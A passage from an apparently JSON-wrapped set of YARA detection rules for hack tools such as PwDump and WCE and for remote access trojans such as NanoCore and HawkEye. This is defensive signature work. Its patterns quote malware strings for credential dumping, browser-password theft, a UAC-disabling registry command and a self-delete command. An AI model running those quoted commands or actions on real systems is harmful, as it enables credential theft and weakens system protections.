wide\n        $credfile4 = \"\\\\Orion\\\\RabbitMQ\\\\.erlang.cookie\" ascii nocase wide\n        $sql1 = \"encryptedkey\" ascii nocase wide fullword\n        $sql2 = \"protectiontype\" ascii nocase wide fullword\n        $sql3 = \"CredentialProperty\" ascii nocase wide fullword\n        $sql4 = \"passwordhash\" ascii nocase wide fullword\n        $sql5 = \"credentialtype\" ascii nocase wide fullword\n        $sql6 = \"passwordsalt\" ascii nocase wide fullword\n    condition:\n        uint16(0) == 0x5A4D and $certificate and ( 2 of ( $credfile* ) or 5 of ( $sql* ) )\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\n/*\n\n   THOR APT Scanner - Hack Tool Extract\n   This rulset is a subset of all hack tool rules included in our\n   APT Scanner THOR - the full featured APT scanner.\n\n   We will frequently update this file with new rules rated TLP:WHITE\n\n   Florian Roth\n   BSK Consulting GmbH\n   Web: bsk-consulting.de\n\n   revision: 20150510\n\n   License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)\n\tCopyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/\n\n*/\n\n/* WCE */\n\nrule WindowsCredentialEditor\n{\n    meta:\n    \tdescription = \"Windows Credential Editor\" threat_level = 10 score = 90\n    strings:\n\t\t$a = \"extract the TGT session key\"\n\t\t$b = \"Windows Credentials Editor\"\n    condition:\n    \t$a or $b\n}\n\nrule Amplia_Security_Tool\n{\n    meta:\n\t\tdescription = \"Amplia Security Tool\"\n\t\tscore = 60\n\t\tnodeepdive = 1\n    strings:\n\t\t$a = \"Amplia Security\"\n\t\t$b = \"Hernan Ochoa\"\n\t\t$c = \"getlsasrvaddr.exe\"\n\t\t$d = \"Cannot get PID of LSASS.EXE\"\n\t\t$e = \"extract the TGT session key\"\n\t\t$f = \"PPWDUMP_DATA\"\n    condition: 1 of them\n}\n\n/* pwdump/fgdump */\n\nrule PwDump\n{\n\tmeta:\n\t\tdescription = \"PwDump 6 variant\"\n\t\tauthor = \"Marc Stroebel\"\n\t\tdate = \"2014-04-24\"\n\t\tscore = 70\n\tstrings:\n\t\t$s5 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa\"\n\t\t$s6 = \"Unable to query service status. Something is wrong, please manually check the st\"\n\t\t$s7 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule PScan_Portscan_1 {\n\tmeta:\n\t\tdescription = \"PScan - Port Scanner\"\n\t\tauthor = \"F. Roth\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"00050;0F0M0X0a0v0}0\"\n\t\t$b = \"vwgvwgvP76\"\n\t\t$c = \"Pr0PhOFyP\"\n\tcondition:\n\t\tall of them\n}\n\nrule HackTool_Samples {\n\tmeta:\n\t\tdescription = \"Hacktool\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"Unable to uninstall the fgexec service\"\n\t\t$b = \"Unable to set socket to sniff\"\n\t\t$c = \"Failed to load SAM functions\"\n\t\t$d = \"Dump system passwords\"\n\t\t$e = \"Error opening sam hive or not valid file\"\n\t\t$f = \"Couldn't find LSASS pid\"\n\t\t$g = \"samdump.dll\"\n\t\t$h = \"WPEPRO SEND PACKET\"\n\t\t$i = \"WPE-C1467211-7C89-49c5-801A-1D048E4014C4\"\n\t\t$j = \"Usage: unshadow PASSWORD-FILE SHADOW-FILE\"\n\t\t$k = \"arpspoof\\\\Debug\"\n\t\t$l = \"Success: The log has been cleared\"\n\t\t$m = \"clearlogs [\\\\\\\\computername\"\n\t\t$n = \"DumpUsers 1.\"\n\t\t$o = \"dictionary attack with specified dictionary file\"\n\t\t$p = \"by Objectif Securite\"\n\t\t$q = \"objectif-securite\"\n\t\t$r = \"Cannot query LSA Secret on remote host\"\n\t\t$s = \"Cannot write to process memory on remote host\"\n\t\t$t = \"Cannot start PWDumpX service on host\"\n\t\t$u = \"usage: %s <system hive> <security hive>\"\n\t\t$v = \"username:domainname:LMhash:NThash\"\n\t\t$w = \"<server_name_or_ip> | -f <server_list_file> [username] [password]\"\n\t\t$x = \"Impersonation Tokens Available\"\n\t\t$y = \"failed to parse pwdump format string\"\n\t\t$z = \"Dumping password\"\n\tcondition:\n\t\t1 of them\n}\n\n/* Disclosed hack tool set */\n\nrule Fierce2\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the Fierce2 domain scanner\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,\"\n\tcondition:\n\t\t1 of them\n}\n\nrule Ncrack\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the Ncrack brute force tool\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"NcrackOutputTable only supports adding up to 4096 to a cell via\"\n\tcondition:\n\t\t1 of them\n}\n\nrule SQLMap\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the SQLMap SQL injection tool\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"except SqlmapBaseException, ex:\"\n\tcondition:\n\t\t1 of them\n}\n\nrule PortScanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file PortScanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"b381b9212282c0c650cb4b0323436c63\"\n\tstrings:\n\t\t$s0 = \"Scan Ports Every\"\n\t\t$s3 = \"Scan All Possible Ports!\"\n\tcondition:\n\t\tall of them\n}\n\nrule DomainScanV1_0 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file DomainScanV1_0.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"aefcd73b802e1c2bdc9b2ef206a4f24e\"\n\tstrings:\n\t\t$s0 = \"dIJMuX$aO-EV\"\n\t\t$s1 = \"XELUxP\\\"-\\\\\"\n\t\t$s2 = \"KaR\\\"U'}-M,.\"\n\t\t$s3 = \"V.)\\\\ZDxpLSav\"\n\t\t$s4 = \"Decompress error\"\n\t\t$s5 = \"Can't load library\"\n\t\t$s6 = \"Can't load function\"\n\t\t$s7 = \"com0tl32:.d\"\n\tcondition:\n\t\tall of them\n}",
  "PoisonIvy_2": "rule PoisonIvy_2\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PoisonIvy\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n    strings:\n    \t$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}\n        $string1 = \"CONNECT %s:%i HTTP/1.0\"\n        $string2 = \"ws2_32\"\n        $string3 = \"cks=u\"\n        $string4 = \"thj@h\"\n        $string5 = \"advpack\"\n    condition:\n\t\t$stub at 0x1620 and all of ($string*) or (all of them)\n}",
  "AAR": "rule AAR : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/AAR\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Hashtable\"\n\t\t$b = \"get_IsDisposed\"\n\t\t$c = \"TripleDES\"\n\t\t$d = \"testmemory.FRMMain.resources\"\n\t\t$e = \"$this.Icon\" wide\n\t\t$f = \"{11111-22222-20001-00001}\" wide\n\t\t$g = \"@@@@@\"\n\n\tcondition:\n\t\tall of them\n}",
  "Ap0calypse": "rule Ap0calypse: RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Ap0calypse\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Ap0calypse\"\n\t\t$b = \"Sifre\"\n\t\t$c = \"MsgGoster\"\n\t\t$d = \"Baslik\"\n\t\t$e = \"Dosyalars\"\n\t\t$f = \"Injecsiyon\"\n\n\tcondition:\n\t\tall of them\n}",
  "Arcom": "rule Arcom : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Arcom\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n        $a1 = \"CVu3388fnek3W(3ij3fkp0930di\"\n        $a2 = \"ZINGAWI2\"\n        $a3 = \"clWebLightGoldenrodYellow\"\n        $a4 = \"Ancestor for '%s' not found\" wide\n        $a5 = \"Control-C hit\" wide\n        $a6 = {A3 24 25 21}\n        \n    condition:\n        all of them\n}",
  "Bandook": "rule Bandook : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/bandook\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n    \t\t$a = \"aaaaaa1|\"\n            $b = \"aaaaaa2|\"\n            $c = \"aaaaaa3|\"\n            $d = \"aaaaaa4|\"\n\t\t\t$e = \"aaaaaa5|\"\n\t\t\t$f = \"%s%d.exe\"\n\t\t\t$g = \"astalavista\"\n\t\t\t$h = \"givemecache\"\n\t\t\t$i = \"%s\\\\system32\\\\drivers\\\\blogs\\\\*\"\n\t\t\t$j = \"bndk13me\"\n\t\t\t\n\n        \n    condition:\n    \t\tall of them\n}",
  "BlackNix": "rule BlackNix : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/BlackNix\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n\t\t$a1 = \"SETTINGS\" wide\n\t\t$a2 = \"Mark Adler\"\n\t\t$a3 = \"Random-Number-Here\"\n\t\t$a4 = \"RemoteShell\"\n\t\t$a5 = \"SystemInfo\"\n\n\t\n\tcondition:\n\t\tall of them\n}",
  "BlueBanana": "rule BlueBanana : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/BlueBanana\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"Java\"\n\n\tstrings:\n\t\t$meta = \"META-INF\"\n\t\t$conf = \"config.txt\"\n\t\t$a = \"a/a/a/a/f.class\"\n\t\t$b = \"a/a/a/a/l.class\"\n\t\t$c = \"a/a/a/b/q.class\"\n\t\t$d = \"a/a/a/b/v.class\"\n\n\t\t\n\tcondition:\n\t\tall of them\n}",
  "ClientMesh": "rule ClientMesh : RAT\n{\n    meta:\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/06\"\n        ref = \"http://malwareconfig.com/stats/ClientMesh\"\n        family = \"torct\"\n\n    strings:\n        $string1 = \"machinedetails\"\n        $string2 = \"MySettings\"\n        $string3 = \"sendftppasswords\"\n        $string4 = \"sendbrowserpasswords\"\n        $string5 = \"arma2keyMass\"\n        $string6 = \"keylogger\"\n        $conf = {00 00 00 00 00 00 00 00 00 7E}\n\n    condition:\n        all of them\n}",
  "DarkRAT": "rule DarkRAT : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/DarkRAT\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"@1906dark1996coder@\"\n\t\t$b = \"SHEmptyRecycleBinA\"\n\t\t$c = \"mciSendStringA\"\n\t\t$d = \"add_Shutdown\"\n\t\t$e = \"get_SaveMySettingsOnExit\"\n\t\t$f = \"get_SpecialDirectories\"\n\t\t$g = \"Client.My\"\n\n\tcondition:\n\t\tall of them\n}",
  "Greame": "rule Greame : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Greame\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\t\n\tstrings:\n    \t\t$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n            $b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n            $c = \"EditSvr\"\n            $d = \"TLoader\"\n\t\t\t$e = \"Stroks\"\n            $f = \"Avenger by NhT\"\n\t\t\t$g = \"####@####\"\n\t\t\t$h = \"GREAME\"\n\t\t\t\n    condition:\n    \t\tall of them\n}",
  "HawkEye": "rule HawkEye : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2015/06\"\n\t\tref = \"http://malwareconfig.com/stats/HawkEye\"\n\t\tmaltype = \"KeyLogger\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$key = \"HawkEyeKeylogger\" wide\n\t\t$salt = \"099u787978786\" wide\n\t\t$string1 = \"HawkEye_Keylogger\" wide\n\t\t$string2 = \"holdermail.txt\" wide\n\t\t$string3 = \"wallet.dat\" wide\n\t\t$string4 = \"Keylog Records\" wide\n        $string5 = \"<!-- do not script -->\" wide\n        $string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"BSPLIT\" wide\n        \n\n\tcondition:\n\t\t$key and $salt and all of ($string*)\n}",
  "Imminent": "rule Imminent : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/Imminent\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n    condition:\n        all of ($v1*) or all of ($v2*)\n}",
  "Infinity": "rule Infinity : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Infinity\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"CRYPTPROTECT_PROMPTSTRUCT\"\n\t\t$b = \"discomouse\"\n\t\t$c = \"GetDeepInfo\"\n\t\t$d = \"AES_Encrypt\"\n\t\t$e = \"StartUDPFlood\"\n\t\t$f = \"BATScripting\" wide\n\t\t$g = \"FBqINhRdpgnqATxJ.html\" wide\n\t\t$i = \"magic_key\" wide\n\n\tcondition:\n\t\tall of them\n}",
  "JavaDropper": "rule JavaDropper : RAT\n{\n    meta:\n\t    author = \" Kevin Breen <kevin@techanarchy.net>\"\n\t    date = \"2015/10\"\n\t    ref = \"http://malwareconfig.com/stats/AlienSpy\"\n\t    maltype = \"Remote Access Trojan\"\n\t    filetype = \"jar\"\n\n    strings:\n\t    $jar = \"META-INF/MANIFEST.MF\"\n\n\t    $a1 = \"ePK\"\n\t    $a2 = \"kPK\"\n\n        $b1 = \"config.ini\"\n        $b2 = \"password.ini\"\n\n        $c1 = \"stub/stub.dll\"\n\n        $d1 = \"c.dat\"\n\n    condition:\n        $jar and (all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*))\n}",
  "LostDoor": "rule LostDoor : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/LostDoor\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n    \t$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}\n        $a1 = \"*mlt* = %\"\n        $a2 = \"*ip* = %\"\n        $a3 = \"*victimo* = %\"\n        $a4 = \"*name* = %\"\n        $b5 = \"[START]\"\n        $b6 = \"[DATA]\"\n        $b7 = \"We Control Your Digital World\" wide ascii\n        $b8 = \"RC4Initialize\" wide ascii\n        $b9 = \"RC4Decrypt\" wide ascii\n        \n    condition:\n    \tall of ($a*) or all of ($b*)\n}",
  "LuminosityLink": "rule LuminosityLink : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/LuminosityLink\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"SMARTLOGS\" wide\n        $b = \"RUNPE\" wide\n        $c = \"b.Resources\" wide\n        $d = \"CLIENTINFO*\" wide\n        $e = \"Invalid Webcam Driver Download URL, or Failed to Download File!\" wide\n        $f = \"Proactive Anti-Malware has been manually activated!\" wide\n        $g = \"REMOVEGUARD\" wide\n        $h = \"C0n1f8\" wide\n        $i = \"Luminosity\" wide\n        $j = \"LuminosityCryptoMiner\" wide\n        $k = \"MANAGER*CLIENTDETAILS*\" wide\n\n    condition:\n        all of them\n}",
  "LuxNet": "rule LuxNet : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/LuxNet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"GetHashCode\"\n\t\t$b = \"Activator\"\n\t\t$c = \"WebClient\"\n\t\t$d = \"op_Equality\"\n\t\t$e = \"dickcursor.cur\" wide\n\t\t$f = \"{0}|{1}|{2}\" wide\n\n\tcondition:\n\t\tall of them\n}",
  "NanoCore": "rule NanoCore : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/NanoCore\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"NanoCore\"\n        $b = \"ClientPlugin\"\n        $c = \"ProjectData\"\n        $d = \"DESCrypto\"\n        $e = \"KeepAlive\"\n        $f = \"IPNETROW\"\n        $g = \"LogClientMessage\"\n\t\t$h = \"|ClientHost\"\n\t\t$i = \"get_Connected\"\n\t\t$j = \"#=q\"\n        $key = {43 6f 24 cb 95 30 38 39}\n\n\n    condition:\n        6 of them\n}",
  "Paradox": "rule Paradox : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Paradox\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"ParadoxRAT\"\n\t\t$b = \"Form1\"\n\t\t$c = \"StartRMCam\"\n\t\t$d = \"Flooders\"\n\t\t$e = \"SlowLaris\"\n\t\t$f = \"SHITEMID\"\n\t\t$g = \"set_Remote_Chat\"\n\n\tcondition:\n\t\tall of them\n}",
  "Plasma": "rule Plasma : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/Plasma\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"Miner: Failed to Inject.\" wide\n        $b = \"Started GPU Mining on:\" wide\n        $c = \"BK: Hard Bot Killer Ran Successfully!\" wide\n        $d = \"Uploaded Keylogs Successfully!\" wide\n        $e = \"No Slowloris Attack is Running!\" wide\n        $f = \"An ARME Attack is Already Running on\" wide\n        $g = \"Proactive Bot Killer Enabled!\" wide\n        $h = \"PlasmaRAT\" wide ascii\n        $i = \"AntiEverything\" wide ascii\n\n    condition:\n        all of them\n}",
  "PredatorPain": "rule PredatorPain : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PredatorPain\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = \"holderwb.txt\" wide\n\t\t$string3 = \"There is a file attached to this email\" wide\n\t\t$string4 = \"screens\\\\screenshot\" wide\n\t\t$string5 = \"Disablelogger\" wide\n\t\t$string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"clearie\" wide\n        $string8 = \"clearff\" wide\n        $string9 = \"emails should be sent to you shortly\" wide\n        $string10 = \"jagex_cache\\\\regPin\" wide\n        $string11 = \"open=Sys.exe\" wide\n\t\t$ver1 = \"PredatorLogger\" wide\n\t\t$ver2 = \"EncryptedCredentials\" wide\n        $ver3 = \"Predator Pain\" wide\n\n\tcondition:\n\t\t7 of ($string*) and any of ($ver*)\n}",
  "Punisher": "rule Punisher : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Punisher\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"abccba\"\n\t\t$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}\n\t\t$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}\n\t\t$d = \"SpyTheSpy\" wide ascii\n\t\t$e = \"wireshark\" wide\n\t\t$f = \"apateDNS\" wide\n\t\t$g = \"abccbaDanabccb\"\n\n\tcondition:\n\t\tall of them\n}",
  "PythoRAT": "rule PythoRAT : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PythoRAT\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"TKeylogger\"\n\t\t$b = \"uFileTransfer\"\n\t\t$c = \"TTDownload\"\n\t\t$d = \"SETTINGS\"\n\t\t$e = \"Unknown\" wide\n\t\t$f = \"#@#@#\"\n\t\t$g = \"PluginData\"\n\t\t$i = \"OnPluginMessage\"\n\n\tcondition:\n\t\tall of them\n}",
  "QRat": "rule QRat : RAT\n{\n    meta:\n        author = \"Kevin Breen @KevTheHermit\"\n        date = \"2015/08\"\n        ref = \"http://malwareconfig.com\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"jar\"\n        \n    strings:\n        $a0 = \"e-data\"\n        $a1 = \"quaverse/crypter\"\n        $a2 = \"Qrypt.class\"\n        $a3 = \"Jarizer.class\"\n        $a4 = \"URLConnection.class\"\n        \n        \n    condition:\n        4 of them\n\n\n}",
  "SmallNet": "rule SmallNet : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/SmallNet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\t\n\tstrings:\n\t\t$split1 = \"!!<3SAFIA<3!!\"\n\t\t$split2 = \"!!ElMattadorDz!!\"\n\t\t$a1 = \"stub_2.Properties\"\n\t\t$a2 = \"stub.exe\" wide\n\t\t$a3 = \"get_CurrentDomain\"\n\n\tcondition:\n\t\t($split1 or $split2) and (all of ($a*))\n}",
  "SpyGate": "rule SpyGate : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/SpyGate\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$split = \"abccba\"\n\t\t$a1 = \"abccbaSpyGateRATabccba\" //$a = Version 0.2.6\n\t\t$a2 = \"StubX.pdb\" \n\t\t$a3 = \"abccbaDanabccb\"\n\t\t$b1 = \"monikerString\" nocase //$b = Version 2.0\n\t\t$b2 = \"virustotal1\"\n\t\t$b3 = \"get_CurrentDomain\"\n\t\t$c1 = \"shutdowncomputer\" wide //$c = Version 2.9\n\t\t$c2 = \"shutdown -r -t 00\" wide\n\t\t$c3 = \"set cdaudio door closed\" wide\n\t\t$c4 = \"FileManagerSplit\" wide\n\t\t$c5 = \"Chating With >> [~Hacker~]\" wide\n\n\tcondition:\n\t\t(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))\n}",
  "Sub7Nation": "rule Sub7Nation : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Sub7Nation\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"EnableLUA /t REG_DWORD /d 0 /f\"\n\t\t$b = \"*A01*\"\n\t\t$c = \"*A02*\"\n\t\t$d = \"*A03*\"\n\t\t$e = \"*A04*\"\t\n\t\t$f = \"*A05*\"\n\t\t$g = \"*A06*\"\n\t\t$h = \"#@#@#\"\n\t\t$i = \"HostSettings\"\n\t\t$verSpecific1 = \"sevane.tmp\"\n\t\t$verSpecific2 = \"cmd_.bat\"\n\t\t$verSpecific3 = \"a2b7c3d7e4\"\n\t\t$verSpecific4 = \"cmd.dll\"\n\n\t\t\n\tcondition:\n\t\tall of them\n}",
  "UPX": "rule UPX : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\n\tstrings:\n\t\t$a = \"UPX0\"\n\t\t$b = \"UPX1\"\n\t\t$c = \"UPX!\"\n\n\tcondition:\n\t\tall of them\n}",
  "Vertex": "rule Vertex : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Vertex\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = \"DEFPATH\"\n\t\t$string2 = \"HKNAME\"\n\t\t$string3 = \"HPORT\"\n\t\t$string4 = \"INSTALL\"\n\t\t$string5 = \"IPATH\"\n\t\t$string6 = \"MUTEX\"\n\t\t$res1 = \"PANELPATH\"\n\t\t$res2 = \"ROOTURL\"\n\n\tcondition:\n\t\tall of them\n}",
  "VirusRat": "rule VirusRat : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/VirusRat\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string0 = \"virustotal\"\n\t\t$string1 = \"virusscan\"\n\t\t$string2 = \"abccba\"\n\t\t$string3 = \"pronoip\"\n\t\t$string4 = \"streamWebcam\"\n\t\t$string5 = \"DOMAIN_PASSWORD\"\n\t\t$string6 = \"Stub.Form1.resources\"\n\t\t$string7 = \"ftp://{0}@{1}\" wide\n\t\t$string8 = \"SELECT * FROM moz_logins\" wide\n\t\t$string9 = \"SELECT * FROM moz_disabledHosts\" wide\n\t\t$string10 = \"DynDNS\\\\Updater\\\\config.dyndns\" wide\n\t\t$string11 = \"|BawaneH|\" wide\n\n\tcondition:\n\t\tall of them\n}",
  "unrecom": "rule unrecom : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/AAR\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$meta = \"META-INF\"\n\t\t$conf = \"load/ID\"\n\t\t$a = \"load/JarMain.class\"\n\t\t$b = \"load/MANIFEST.MF\"\n        $c = \"plugins/UnrecomServer.class\"\n\n\tcondition:\n\t\tall of them\n}",
  "sakula_v1_0": "rule sakula_v1_0: RAT\n{\n    meta:\n        description = \"Sakula v1.0\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n                $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of ($m*) and not $v1_1\n}",
